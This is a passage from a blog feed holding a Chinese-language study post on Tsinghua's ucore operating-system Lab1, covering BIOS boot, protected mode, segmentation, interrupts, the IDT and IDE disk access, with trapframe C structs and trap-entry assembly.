class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>因为此时已经通过了semant, 可以确定AST是正确的从而<strong>无需检查</strong><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>Stanford-cs143-pdf中提到的<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>complier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tsinghua操作系统课程</title>
    <link href="/2021-10/Archive-ucore/"/>
    <url>/2021-10/Archive-ucore/</url>
    
    <content type="html"><![CDATA[<h1 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-BIOS启动顺序"><a href="#1-BIOS启动顺序" class="headerlink" title="1.BIOS启动顺序"></a>1.BIOS启动顺序</h3><ul><li>CPU加电后代码段寄存器初始化为<strong>CS = F000H, EIP = 0000FFF0H</strong>, 然后再计算 Base+IP = FFFF0000H + 0000FFF0H = FFFFFFF0H 得到BIOS的<a href="https://en.wikipedia.org/wiki/EPROM">EPROM</a>(Erasable Programmable Read Only Memory)所在地, 这个地址的第一条指令是一个<strong>长跳转指令</strong>(这样CS和EIP都会更新)到BIOS代码中执行</li><li>BIOS做完计算机硬件自检和初始化后，会选择一个启动设备（例如软盘、硬盘、光盘等），并且读取该设备的第一扇区(即主引导扇区或启动扇区)到内存一个特定的地址0x7c00处，然后CPU控制权会转移到那个地址继续执行。至此BIOS的初始化工作做完了，进一步的工作交给了ucore的<strong>bootloader</strong>。</li></ul><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_3_1_bios_booting.html#%E8%A1%A5%E5%85%85%E4%BF%A1%E6%81%AF">附</a>:</p><ul><li>在16位的8086 CPU时代，内存限制在1MB范围内，且BIOS的代码固化在EPROM中。在基于Intel的8086 CPU的PC机中的EPROM被编址在1ＭB内存地址空间的最高64KB中。PC加电后，CS寄存器初始化为<strong>0xF000</strong>，IP寄存器初始化为<strong>0xFFF0</strong>, CS:IP=0xF000:0XFFF0（Segment:Offset 表示）=<strong>0xFFFF0</strong>(Linear表示)</li><li>默认将执行BIOS ROM编址在32位内存地址空间的最高端，即位于4GB地址的最后一个64KB内。在PC系统开机复位时，CPU进入实模式，并将CS寄存器设置成0xF000，将它的<strong>shadow register</strong>的<strong>Base</strong>值初始化设置为0xFFFF0000，EIP寄存器初始化设置为0x0000FFF0。所以机器执行的第一条指令的物理地址是<strong>0xFFFFFFF0</strong>。80386的BIOS代码也要和以前8086的BIOS代码兼容，故地址0xFFFFFFF0处的指令还是一条长跳转指令<code>jmp F000:E05B</code>。注意，这个长跳转指令会触发更新CS寄存器和它的shadow register，即执行<code>jmp F000 : E05B</code>后，CS将被更新成0xF000。表面上看CS其实没有变化，但CS的shadow register被更新为另外一个值了，它的Base域被更新成0x000F0000，此时形成的物理地址为Base+EIP=0x000FE05B，这就是CPU执行的第二条指令的地址。此时这条指令的地址已经是1M<strong>以内</strong>了，且此地址不再位于BIOS ROM中，而是位于RAM空间中。由于Intel设计了一种映射机制，将内存高端的BIOS ROM映射到1MB以内的RAM空间里，并且可以使这一段被映射的RAM空间具有与ROM类似的只读属性。所以PC机启动时将开启这种映射机制，让4GB地址空间的最高一个64KB的内容等同于1MB地址空间的最高一个64K的内容，从而使得执行了长跳转指令后，其实是回到了早期的8086 CPU初始化控制流，保证了向下兼容</li></ul><p>例图:</p><img src="https://i.loli.net/2021/11/15/gqzhf1o9HjFSRZd.png" alt="image-20211110102048633"  /><img src="https://i.loli.net/2021/11/15/5smFgYn7Bxhq3Ke.png" alt="image-20211110101314467" style="zoom:67%;" /><h3 id="2-实模式"><a href="#2-实模式" class="headerlink" title="2.实模式"></a>2.实模式</h3><p>参考资料:《Intel 80386 Reference Programmers Manual-i386》, 基本是这个的翻译</p><p>在<strong>bootloader</strong>接手BIOS的工作后，当前的PC系统处于实模式（16位模式）运行状态，在这种状态下软件可访问的物理内存空间不能超过1MB，且无法发挥Intel 80386以上级别的32位CPU的4GB内存管理能力。</p><p>实模式将整个物理内存看成分段的区域，程序代码和数据位于不同区域，操作系统和用户程序并没有区别对待，<strong>而且每一个指针都是指向实际的物理地址</strong>。这样，用户程序的一个指针如果指向了操作系统区域或其他用户程序区域，并修改了内容，那么其后果就很可能是灾难性的。通过修改A20地址线可以完成从实模式到保护模式的转换。有关A20的进一步信息可参考“<a href="http://hengch.blog.163.com/blog/static/107800672009013104623747/">关于A20 Gate</a>”。z</p><img src="https://i.loli.net/2021/11/15/v6fC2e43WESLcaU.png" alt="img" style="zoom: 67%;" /><ul><li><strong>地址<code>0-0x9ffff</code>的640KB内存是DRAM，即插在主板上的内存条。</strong><br>顶部<code>0xf0000-0xfffff</code>的64KB内存是ROM，存放BIOS代码。</li><li>EPROM是通过地址来访问的, 80386将其映射到内存的顶端, 其他的一些外设也同样通过映射到地址空间来访问它们</li></ul><h3 id="3-分段机制-保护模式"><a href="#3-分段机制-保护模式" class="headerlink" title="3.分段机制/保护模式"></a>3.分段机制/保护模式</h3><h4 id="a-保护模式"><a href="#a-保护模式" class="headerlink" title="a.保护模式"></a>a.保护模式</h4><ul><li><p>只有在保护模式下，80386的<strong>全部32根地址线有效</strong>，可寻址高达4G字节的线性地址空间和物理地址空间，可访问64TB（有2^14^个段，每个段最大空间为2^32^字节）的逻辑地址空间，可采用分段存储管理机制和分页存储管理机制。这不仅为存储共享和保护提供了硬件支持，而且为实现虚拟存储提供了硬件支持。通过提供4个特权级和完善的特权检查机制，既能实现资源共享又能保证代码数据的安全及任务的隔离。</p><blockquote><p>【补充】保护模式下，有两个段表：GDT（Global Descriptor Table）和LDT（Local Descriptor Table），每一张段表可以包含8192 (2^13)个描述符[1]，因而最多可以同时存在2 * 2^13 = 2^14^个段。虽然保护模式下可以有这么多段，逻辑地址空间看起来很大，但实际上段并不能扩展物理地址空间，很大程度上各个段的地址空间是<strong>相互重叠</strong>的。目前所谓的64TB（2^(14+32)^=2^46^）逻辑地址空间是一个理论值，没有实际意义。在32位保护模式下，真正的物理空间仍然只有2^32字节那么大。注：在ucore lab中只用到了GDT，没有用LDT。</p><p>Reference: [1] 3.5.1 Segment Descriptor Tables, Intel® 64 and IA-32 Architectures Software Developer’s Manual</p></blockquote></li></ul><h4 id="b-分段机制"><a href="#b-分段机制" class="headerlink" title="b.分段机制"></a>b.分段机制</h4><blockquote><p>b,c,d顺序按照<strong>35</strong>年前的i386文档, 图片来自IA-32文档</p></blockquote><ul><li><p>将内存划分成以起始地址和长度限制这两个二维参数表示的内存块，这些内存块就称之为段（Segment）。编译器把源程序编译成执行程序时用到的代码段、数据段、堆和栈等概念在这里可以与段联系起来，二者在含义上是一致的</p></li><li><p>转换逻辑地址（Logical Address,应用程序员看到的地址）到物理地址（Physical Address, 实际的物理内存地址）分以下两步：</p><p>[1] 分段地址转换：<img src="https://i.loli.net/2021/11/15/2voBNa4eHCJYpDS.png" alt="image-20211110224722534" style="zoom:67%;" /></p><p>[2] 分页地址转换，这一步中把线性地址转换为物理地址。（注意：这一步是可选的，由操作系统决定是否需要。在后续试验中会涉及。</p></li></ul><h4 id="c-Segment-Selector"><a href="#c-Segment-Selector" class="headerlink" title="c.Segment Selector"></a>c.Segment Selector</h4><ul><li>A segment selector is a 16-bit identifier for a segment (see Figure 3-6). It does not point directly to the segment,<br>but instead points to the segment descriptor that defines the segment. </li></ul><img src="https://i.loli.net/2021/11/15/2pZPMgihVI6QSrR.png" alt="image-20211110233814790" style="zoom:67%;" /><h4 id="d-Segment-register"><a href="#d-Segment-register" class="headerlink" title="d.Segment register"></a>d.Segment register</h4><ul><li><p>For virtually any kind of program execution to take place, at least the code-segment (CS), data-segment (DS), and stack-segment (SS) registers must be loaded with valid segment selectors.</p></li><li><p>three additional data-segment registers (ES, FS, and GS) are optional</p><img src="https://i.loli.net/2021/11/15/JX7IuMO4QodfVFK.png" alt="image-20211110232108110" style="zoom: 67%;" /></li><li><p>For a program to access a segment, the segment selector for the segment <strong>must have been loaded in one of the</strong><br><strong>segment registers</strong>. So, although a system can define thousands of segments, <strong>only 6 can be available</strong> for immediate<br>use. </p></li><li><p><strong>shadow register(“hidden” part):</strong></p><p>When a segment selector is loaded into the visible part, the processor also loads the hidden part from the segment descriptor pointed to by the segment selector</p></li></ul><h4 id="e-Segment-Descriptor"><a href="#e-Segment-Descriptor" class="headerlink" title="e.Segment Descriptor"></a>e.Segment Descriptor</h4><blockquote><p><strong>来自IA-32文档 P2902/3-10 Vol. 3A</strong> </p></blockquote><img src="..\..\image\ucore\IxTJPGOZWVjz2BD-16373800575412.png" alt="image-20211110230124631.png" style="zoom:80%;" /><h4 id="f-Global-Descriptor-Tables"><a href="#f-Global-Descriptor-Tables" class="headerlink" title="f.Global Descriptor Tables"></a>f.Global Descriptor Tables</h4><blockquote><p><strong>(IA-32 P2906/ 3-14 Vol. 3A)</strong>:</p></blockquote><p>全局描述符表的是一个保存多个段描述符的“数组”，其起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。由于GDT 不能有GDT本身之内的描述符进行描述定义，所以处理器采用GDTR为GDT这一特殊的系统段。注意，全局描述符表中第一个段描述符设定为空段描述符。GDTR中的段界限以字节为单位。对于含有N个描述符的描述符表的段界限通常可设为8*N-1。</p><img src="https://i.loli.net/2021/11/15/t1iNrJbCeBzASFf.png" alt="image-20211110230336834" style="zoom:67%;" /><h4 id="g-Privilege-Level"><a href="#g-Privilege-Level" class="headerlink" title="g.Privilege Level"></a>g.Privilege Level</h4><ul><li>Current privilege level (<strong>CPL</strong>) — The CPL is the privilege level of the currently executing program or task. <u>It</u><br><u>is stored in bits 0 and 1 of the CS and SS segment registers.</u> Normally, the CPL is equal to the privilege level of<br>the code segment from which instructions are being fetched. The processor changes the CPL when program<br>control is transferred to a code segment with a different privilege level. </li></ul><blockquote><p>The CPL is treated slightly differently when accessing <strong>conforming code segments</strong>. Conforming code segments can be accessed from any privilege level that is equal to or numerically greater (less privileged) than the DPL of the conforming code segment. Also, the CPL is not changed when the processor accesses a conforming code segment that has a different privilege level than the CPL.</p></blockquote><ul><li>Descriptor privilege level (<strong>DPL</strong>) — The DPL is the privilege level of a segment or gate. It is stored in the DPL<br>field of the segment or gate descriptor for the segment or gate. </li><li>Requested privilege level (<strong>RPL</strong>) — The RPL is an override privilege level that is assigned to segment<br>selectors. It is stored in bits 0 and 1 of the segment selector. The RPL can be used to ensure that privileged code<br>does not access a segment on behalf of an application program unless the program itself has access privileges for<br>that segment. See Section 5.10.4, “Checking Caller Access Privileges (ARPL Instruction),” for a detailed description of<br>the purpose and typical use of the RPL.</li></ul><p><strong>PRIVILEGE CHECK:</strong> </p><p><img src="https://i.loli.net/2021/11/16/JGd27NnTwFDipOe.jpg" alt="img"></p><h3 id="4-中断与异常"><a href="#4-中断与异常" class="headerlink" title="4.中断与异常"></a>4.中断与异常</h3><ul><li>中断机制给操作系统提供了处理意外情况的能力，同时它也是实现进程/线程抢占式调度的一个重要基石。但中断的引入导致了对操作系统的理解更加困难。</li><li>在操作系统中，有三种特殊的中断事件。<ul><li>由CPU<em>外部设备引起的</em> 外部事件如I/O中断、时钟中断、控制台中断等是异步产生的（即产生的时刻不确定），与CPU的执行无关，我们称之为<strong>异步中断</strong>(asynchronous interrupt)也称外部中断,简称<strong>中断</strong>(interrupt)。</li><li>而把在CPU执行指令期间检测到<em>不正常的或非法</em> 的条件(如除零错、地址访问越界)所引起的内部事件称作<strong>同步中断</strong>(synchronous interrupt)，也称内部中断，简称**异常(**exception)。</li><li>把在程序中使用<em>请求系统服务</em> 的系统调用而引发的事件，称作<strong>陷入中断</strong>(trap interrupt)，也称<strong>软中断</strong>(soft interrupt)，系统调用(system call)简称<strong>trap</strong>。在后续试验中会进一步讲解系统调用。</li></ul></li></ul><img src="https://i.loli.net/2021/11/16/5HxAC9w4XSiasbK.png"  style="zoom: 60%;" /><ul><li><p><strong>Interrupt Descriptor Table</strong>:同GDT一样，IDT是一个8字节的描述符数组，但IDT的第一项可以包含一个描述符。CPU把中断（异常）号乘以8做为IDT的索引。IDT可以位于内存的任意位置，CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址。指令LIDT和SIDT用来操作IDTR。两条指令都有一个显示的操作数：一个6字节表示的内存地址(包含线性地址基址和界限)。</p><p>在保护模式下，最多会存在256个Interrupt/Exception Vectors。</p><p>范围[0，31]内的32个向量被异常Exception和NMI使用，但当前并非所有这32个向量都已经被使用，有几个当前没有被使用的，请不要擅自使用它们，它们被保留，以备将来可能增加新的Exception。</p><p>范围[32，255]内的向量被保留给用户定义的Interrupts。Intel没有定义，也没有保留这些Interrupts。用户可以将它们用作外部I/O设备中断（8259A IRQ），或者系统调用（System Call 、Software Interrupts）等。</p></li><li><p><strong>IDT gate descriptors</strong>: Interrupts/Exceptions应该使用Interrupt Gate和Trap Gate，它们之间的唯一区别就是：当调用Interrupt Gate时，Interrupt会被CPU自动禁止；而调用Trap Gate时，CPU则不会去禁止或打开中断，而是保留它原来的样子。</p><blockquote><p>【补充】所谓“自动禁止”，指的是CPU跳转到interrupt gate里的地址时，在将EFLAGS保存到栈上之后，清除EFLAGS里的IF位，以避免重复触发中断。在中断处理例程里，操作系统可以将EFLAGS里的IF设上,从而允许嵌套中断。但是必须在此之前做好处理嵌套中断的必要准备，如保存必要的寄存器等。二在ucore中访问Trap Gate的目的是为了实现系统调用。用户进程在正常执行中是不能禁止中断的，而当它发出系统调用后，将通过Trap Gate完成了从用户态（ring 3）的用户进程进了核心态（ring 0）的OS kernel。如果在到达OS kernel后禁止EFLAGS里的IF位，第一没意义（因为不会出现嵌套系统调用的情况），第二还会导致某些中断得不到及时响应，所以调用Trap Gate时，CPU则不会去禁止中断。总之，interrupt gate和trap gate之间没有优先级之分，仅仅是CPU在处理中断时有不同的方法，供操作系统在实现时根据需要进行选择。</p></blockquote></li><li><p>在IDT中，可以包含如下3种类型的Descriptor：</p><ul><li>Task-gate descriptor （这里没有使用）</li><li>Interrupt-gate descriptor （中断方式用到）</li><li>Trap-gate descriptor（系统调用用到）</li></ul></li></ul><img src="https://i.loli.net/2021/11/16/qbyzSN56w9eDHKX.png" alt="image-20211116161700420" style="zoom:70%;" /><p>​    Interrrupt Gate and Trap Gate 和Call Gate非常相似, 不同的Gate用3bit的Type来表示:</p><img src="https://s2.loli.net/2021/12/20/FOG4zJsyutojfen.png" alt="image-20211209164600135" style="zoom:67%;" /><h4 id="由硬件完成的工作"><a href="#由硬件完成的工作" class="headerlink" title="由硬件完成的工作"></a>由硬件完成的工作</h4><ul><li><p>硬件中断处理过程1（==起始==）：从CPU收到中断事件后，打断当前程序或任务的执行，根据某种机制跳转到中断服务例程去执行的过程。其具体流程如下：</p><ul><li>CPU在执行完当前程序的每一条指令后，都会去确认在执行刚才的指令过程中中断控制器（如：<a href="https://blog.csdn.net/longintchar/article/details/79439466">8259A</a>）是否发送中断请求过来，如果有那么CPU就会在相应的时钟脉冲到来时从总线上读取中断请求对应的中断向量；</li><li>CPU根据得到的中断向量（以此为索引）到IDT中找到该向量对应的中断描述符，中断描述符里保存着中断服务例程的段选择子；</li><li>CPU使用IDT查到的中断服务例程的段选择子从**GDT(这几个表一定要区分开来, 现在这个是指寻址的段描述符表)**中取得相应的段描述符，段描述符里保存了中断服务例程的段基址和属性信息，此时CPU就得到了中断服务例程的起始地址</li></ul><p>以上三个过程示意图: <a href='#ipc' id='ipc_r'>link</a> </p><ul><li>CPU会根据CPL和中断服务例程的段描述符的DPL信息确认是否发生了特权级的转换。比如当前程序正运行在用户态，而中断程序是运行在内核态的，则意味着发生了特权级的转换，这时CPU会从当前程序的<strong>TSS</strong>信息（该信息在内存中的起始地址存在TR寄存器中）里取得该程序的内核栈地址，即包括内核态的ss和esp的值，<strong>并立即将系统当前使用的栈切换成新的内核栈。</strong>这个栈就是即将运行的中断服务程序要使用的栈。紧接着就将当前程序使用的用户态的ss和esp压到新的内核栈中保存起来；</li><li>CPU需要开始保存当前被打断的程序的现场（即一些寄存器的值），以便于将来恢复被打断的程序继续执行。这需要利用内核栈来保存相关现场信息，即依次压入当前被打断程序使用的eflags，cs，eip，errorCode（如果是有错误码的异常）信息；</li><li>CPU利用中断服务例程的段描述符将其第一条指令的地址加载到cs和eip寄存器中，开始执行中断服务例程。这意味着先前的程序被暂停执行，中断服务程序正式开始工作。</li></ul></li></ul><hr><ul><li><p>硬件中断处理过程2（==结束==）：中断处理工作完成后需要通过iret（或iretd）指令恢复被打断的程序的执行。CPU执行IRET指令的具体过程如下：</p><ul><li>程序执行这条iret指令时，首先会从内核栈里弹出先前保存的被打断的程序的现场信息，即eflags，<code>cs</code>，eip重新开始执行；</li><li>如果存在特权级转换（<code>CS(CPL)&gt;DPL</code>），则还需要从内核栈中弹出用户态栈的ss和esp，这样也意味着栈也被切换回原先使用的用户态的栈了；</li><li>如果此次处理的是带有错误码（errorCode）的异常，CPU在恢复先前程序的现场时，并不会弹出errorCode。这一步需要通过软件完成，即要求相关的中断服务例程在调用iret返回之前添加出栈代码主动弹出errorCode。</li></ul></li></ul><p><a href='#ipc_r' id='ipc'><img src="https://i.loli.net/2021/11/16/hGLAjlTYVSWpk67.png" alt="image-20211116161700420" style="zoom:70%;" /></a></p><h4 id="特权级检查"><a href="#特权级检查" class="headerlink" title="特权级检查"></a>特权级检查</h4><ul><li><p>中断处理得==特权级转换==是通过门描述符（gate descriptor）和相关指令来完成的。一个门描述符就是一个系统类型的段描述符，一共有4个子类型：</p><ul><li>调用门描述符（call-gate descriptor may reside in the GDT or in an LDT, but not in the interrupt descriptor table (IDT)），</li><li>中断门描述符（interrupt-gate descriptor）</li><li>陷阱门描述符（trap-gate descriptor）</li><li>任务门描述符（task-gate descriptor）。</li></ul><p>Task gates are used for task switching and are discussed in Chapter 7, “Task Management”. Trap and interrupt<br>gates are special kinds of call gates used for calling exception and interrupt handlers。中断门描述符和陷阱门描述符几乎是一样的。</p><ul><li>中断发生时实施特权检查的过程如下图所示：</li></ul><img src="https://i.loli.net/2021/11/16/fqGtF4SHxWPCJhg.png" alt="这里是图片描述" style="zoom:80%;" /><ul><li>门中的DPL和段选择符一起控制着访问，同时，段选择符结合偏移量（Offset）指出了中断处理例程的入口点。内核一般在门描述符中填入内核代码段的段选择子。产生中断前后，CPU一定不会将运行控制从高特权环转向低特权环，特权级必须要么保持不变（当操作系统内核自己被中断的时候），或被提升（当用户态程序被中断的时候）。无论哪一种情况，CPL必须大于等于目的代码段的DPL。如果CPL发生了改变，一个堆栈切换操作（通过<strong>TSS</strong>完成）就会发生。如果中断是被用户态程序中的指令所触发的（比如软件执行INT n生产的中断），还会增加一个额外的检查：门的DPL必须具有与CPL相同或更低的特权。这就防止了用户代码随意触发中断。如果这些检查失败，会产生一个一般保护异常（general-protection exception）。</li></ul></li></ul><h4 id="ucore的实现流程"><a href="#ucore的实现流程" class="headerlink" title="ucore的实现流程"></a>ucore的实现流程</h4><ol><li>首先中断有几种类型<ul><li>使用int软中断, 中断号为<code>T_SWITCH_TOU</code>. 由于一开始ucore运行在内核, 所以内核到用户时会弹出栈上的ss和esp, 所以要在int指令前面加上两个push, 还要注意指令的字节长度匹配.</li><li>使用int软中断, 中断号为<code>T_SWITCH_TOK</code>. 这个时候从用户态到内核态, 要通过TR寄存器查找当前的内核栈地址, 立即切换然后压入用户态的ss和esp, 由于challenge里有说明不用返回, 所以int执行完后要释放这两个东西.</li><li>其他情况就是时钟中断和键盘中断到目前为止都是内核-&gt;内核再跳回内核, 没有什么复杂之处.</li></ul></li><li>cpu接收到中断号, 然后到IDT表里把中断号当做下标查找Interrupt Discriptor, 这个时候就找到了中断处理例程的入口地址.</li><li>cpu依次压入eflags，cs，eip, errorCode(如果是有错误码的异常), 然后加载描述符中的地址, 进入中断处理例程.</li><li>处理例程一开始就是两个pushl, 分别是errorCode和trapno), 再jmp到<code>__alltraps</code>把可能需要改变的寄存器值压到栈上<br>在栈上倒着构建一个trapframe</li><li>接下来进入处理例程, 0-31中断号由Intel保留, ucore定义的用<code>IRQ_OFFSET + IRQ_xx</code><ul><li>如果是时钟中断, inc一个全局变量tick, 没啥复杂的</li><li>如果是特权级转换, 更改一下trapframe的cs, es, ds, fs即可</li></ul></li><li>执行完毕后弹出由我们压入的寄存器值, 然后到了<code>__altraps</code>的<code>iret</code>指令,  由cpu弹出eip, cs, eflags</li><li>判断特权级转换来决定是否弹出ss, esp, <strong>中断结束</strong> </li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* registers as pushed by pushal */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pushregs</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> reg_edi;<br>    <span class="hljs-keyword">uint32_t</span> reg_esi;<br>    <span class="hljs-keyword">uint32_t</span> reg_ebp;<br>    <span class="hljs-keyword">uint32_t</span> reg_oesp;          <span class="hljs-comment">/* Useless */</span><br>    <span class="hljs-keyword">uint32_t</span> reg_ebx;<br>    <span class="hljs-keyword">uint32_t</span> reg_edx;<br>    <span class="hljs-keyword">uint32_t</span> reg_ecx;<br>    <span class="hljs-keyword">uint32_t</span> reg_eax;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pushregs</span> <span class="hljs-title">tf_regs</span>;</span><br>    <span class="hljs-keyword">uint16_t</span> tf_gs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding0;<br>    <span class="hljs-keyword">uint16_t</span> tf_fs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding1;<br>    <span class="hljs-keyword">uint16_t</span> tf_es;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding2;<br>    <span class="hljs-keyword">uint16_t</span> tf_ds;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding3;<br>    <span class="hljs-keyword">uint32_t</span> tf_trapno;<br>    <span class="hljs-comment">/* below here defined by x86 hardware */</span><br>    <span class="hljs-keyword">uint32_t</span> tf_err;<br>    <span class="hljs-keyword">uintptr_t</span> tf_eip;<br>    <span class="hljs-keyword">uint16_t</span> tf_cs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding4;<br>    <span class="hljs-keyword">uint32_t</span> tf_eflags;<br>    <span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br>    <span class="hljs-keyword">uintptr_t</span> tf_esp;<br>    <span class="hljs-keyword">uint16_t</span> tf_ss;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding5;<br>&#125; __attribute__((packed));<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">#----------------------------vector.S<br>.globl vector120<br>vector120:<br>  pushl $0<br>  pushl $120<br>  jmp __alltraps<br>#----------------------------trapentry.S<br>#include &lt;memlayout.h&gt;<br><br># vectors.S sends all traps here.<br>.text<br>.globl __alltraps<br>__alltraps:<br>    # push registers to build a trap frame<br>    # therefore make the stack look like a struct trapframe<br>    pushl %ds<br>    pushl %es<br>    pushl %fs<br>    pushl %gs<br>    pushal<br><br>    # load GD_KDATA into %ds and %es to set up data segments for kernel<br>    movl $GD_KDATA, %eax<br>    movw %ax, %ds<br>    movw %ax, %es<br><br>    # push %esp to pass a pointer to the trapframe as an argument to trap()<br>    pushl %esp<br><br>    # call trap(tf), where tf=%esp<br>    call trap<br><br>    # pop the pushed stack pointer<br>    popl %esp<br><br>    # return falls through to trapret...<br>.globl __trapret<br>__trapret:<br>    # restore registers from stack<br>    popal<br><br>    # restore %ds, %es, %fs and %gs<br>    popl %gs<br>    popl %fs<br>    popl %es<br>    popl %ds<br><br>    # get rid of the trap number and error code<br>    addl $0x8, %esp<br>    iret<br></code></pre></div></td></tr></table></figure><h3 id="5-地址空间"><a href="#5-地址空间" class="headerlink" title="5.地址空间"></a>5.地址空间</h3><pre><code class=" mermaid">flowchart LR    逻辑地址或虚拟地址--&gt;|分段地址转换|线性地址    线性地址--&gt;|分页地址转换|物理地址    线性地址--&gt;End</code></pre><h3 id="6-硬件访问"><a href="#6-硬件访问" class="headerlink" title="6.硬件访问"></a>6.<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_3_2_3_dist_accessing.html">硬件访问</a></h3><p>bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。</p><p>一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。</p><p>表一 磁盘IO地址和对应功能</p><p>第6位：为1=LBA模式；0 = CHS模式 第7位和第5位必须为1</p><table><thead><tr><th>IO地址</th><th>功能</th></tr></thead><tbody><tr><td>0x1f0</td><td>读数据，当0x1f7不为忙状态时，可以读。</td></tr><tr><td>0x1f2</td><td>要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td></tr><tr><td>0x1f3</td><td>如果是LBA模式，就是LBA参数的0-7位</td></tr><tr><td>0x1f4</td><td>如果是LBA模式，就是LBA参数的8-15位</td></tr><tr><td>0x1f5</td><td>如果是LBA模式，就是LBA参数的16-23位</td></tr><tr><td>0x1f6</td><td>第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td></tr><tr><td>0x1f7</td><td>状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td></tr></tbody></table><p>当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程（可参看boot/bootmain.c中的readsect函数实现）大致如下：</p><ol><li>等待磁盘准备好</li><li>发出读取扇区的命令</li><li>等待磁盘准备好</li><li>把磁盘扇区数据读到指定内存</li></ol><h3 id="附-TSS"><a href="#附-TSS" class="headerlink" title="附: TSS"></a>附: TSS</h3><p>在<code>kern_init()-&gt;pmm_init()-&gt;gdt_init()</code>中初始化, TSS中的内核栈地址就在这里设置</p><p>TSS可以在内存的任意位置, 而ucore的taskstate定义在pmm.c中, 通过构造<em>门描述符</em> , 弄到<code>struct segdesc gdt[]</code>里面,<br>然后使用lgdt指令加载到GDT中, <strong>内核栈(8KB)从<code>c0120000 bootstack</code>到<code>c0122000 bootstacktop</code></strong>, 在entry.S中找到的, kernel.sym可看地址</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...详见Lab2<br><span class="hljs-comment">// Since we are using bootloader&#x27;s GDT,</span><br>  <span class="hljs-comment">// we should reload gdt (second time, the last time) to get user segments and the TSS</span><br>  <span class="hljs-comment">// map virtual_addr 0 ~ 4G = linear_addr 0 ~ 4G</span><br>  <span class="hljs-comment">// then set kernel stack (ss:esp) in TSS, setup TSS in gdt, load TSS</span><br>  gdt_init();<br>  